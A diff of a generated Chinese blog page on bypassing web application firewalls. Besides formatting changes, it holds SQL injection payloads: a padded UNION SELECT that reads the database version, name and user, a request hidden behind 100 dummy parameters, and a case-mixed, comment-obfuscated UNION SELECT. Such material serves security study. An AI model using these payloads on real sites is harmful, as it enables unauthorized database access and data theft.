@@ -497,6 +497,9 @@ id=1 UnIoN/**/SeLeCT 1,user(">
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -532,11 +535,12 @@ id=1 UnIoN/**/SeLeCT 1,user(">
 <p>2、性能问题</p>
 <p><strong>猜想 1</strong>：在设计 WAF 系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只 要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p>
 <p>例：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span>)<span class="operator">=</span>(<span class="keyword">Select</span> <span class="number">0xA</span><span class="operator">*</span><span class="number">1000</span>)<span class="operator">+</span><span class="keyword">UnIoN</span><span class="operator">+</span><span class="keyword">SeLeCT</span><span class="operator">+</span><span class="number">1</span>,<span class="number">2</span>,version(),<span class="number">4</span>,<span class="number">5</span>,database(),<span class="keyword">user</span>(),<span class="number">8</span>,<span class="number">9</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">Select</span> <span class="token number">0xA</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">UnIoN</span><span class="token operator">+</span><span class="token keyword">SeLeCT</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p> PS：0xA*1000 指 0xA 后面”A”重复 1000 次，一般来说对应用软件构成缓冲区溢出都需要较大的测试 长度，这里 1000 只做参考也许在有些情况下可能不需要这么长也能溢出。</p>
 <p><strong>猜想 2</strong>：不少 WAF 是 C 语言写的，而 C 语言自身没有缓冲区保护机制，因此如果 WAF 在处理测试向 量时超出了其缓冲区长度就会引发 bug，从而实现绕过。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a0<span class="operator">=</span><span class="number">0</span><span class="operator">&amp;</span>a1<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>.....<span class="operator">&amp;</span>a100<span class="operator">=</span><span class="number">100</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,schema_name,<span class="number">3</span> <span class="keyword">from</span></span><br><span class="line">INFORMATION_SCHEMA.schemata</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?a0<span class="token operator">=</span><span class="token number">0</span><span class="token operator">&amp;</span>a1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>a100<span class="token operator">=</span><span class="token number">100</span><span class="token operator">&amp;</span>id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>schema_name<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span>
+INFORMATION_SCHEMA<span class="token punctuation">.</span>schemata<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>备注：获取请求参数，只获取前 100 个参数，第 101 个参数并没有获取到，导致 SQL 注入绕过。</p>
 <p>3、白名单</p>
@@ -1000,7 +1004,7 @@ id=1 UnIoN/**/SeLeCT 1,user(">
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">31.4k</span>
+                        class="white-color">32.1k</span>
             
             
             
